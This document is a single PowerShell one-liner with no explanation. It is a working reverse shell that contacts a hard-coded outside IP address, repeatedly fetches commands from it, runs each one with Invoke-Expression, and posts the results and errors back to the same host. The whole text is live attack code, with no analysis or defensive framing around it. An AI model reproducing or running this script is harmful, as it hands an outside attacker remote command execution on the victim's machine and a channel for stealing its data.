$s='54.157.172.71:7000';$i='b947b029-d22a7a35-76b4f2bd';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/b947b029 -Headers @{"Authorizatiion"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/d22a7a35 -Headers @{"Authorizatiion"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/76b4f2bd -Method POST -Headers @{"Authorizatiion"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
